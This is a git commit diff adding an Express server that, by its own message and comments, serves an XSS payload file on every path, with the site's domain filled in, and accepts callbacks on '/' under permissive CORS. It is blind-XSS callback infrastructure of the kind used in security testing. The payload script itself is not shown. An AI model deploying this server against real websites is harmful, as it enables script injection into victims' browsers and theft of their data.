57243e8fa5c4f102af6ef7d15261d5855acc4b29
Isira Adithya <rp.isira@gmail.com>
2025-02-26 07:57:01 +0530

    XSS payloads are served when accessed /* and / will catch the callback

--- server/backend/index.js
+++ server/backend/index.js
@@ -1,4 +1,5 @@
 import express from "express";
+import fs from "fs";
 import { PrismaClient } from "@prisma/client";
 
 // Create Prisma client instance
@@ -12,7 +13,41 @@ try {
     console.error("Prisma connection error:", error);
 }
 
+// Express Server
 const server = express();
+server.use(express.json());
+
+server.options("/", (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    res.status(200).send();
+});
+server.post("/", async (req, res) => {
+    // Set CORS headers
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    res.status(200).send();
+});
+
+// Serve the XSS payload
+server.all("/*", async (req, res) => {
+
+    // Prepare the response
+    let result = fs.readFileSync("assets/base.js", "utf-8");
+    result = result.replace("{{DOMAIN}}", req.headers['host'] ?? 'example.com');
+
+    // Set CORS headers
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+
+    // File Type
+    res.setHeader('Content-Type', 'text/javascript');
+    res.status(200).send(result);
+})
+
 server.listen(3000, () => {
     console.log("Server running on port 3000");
 });
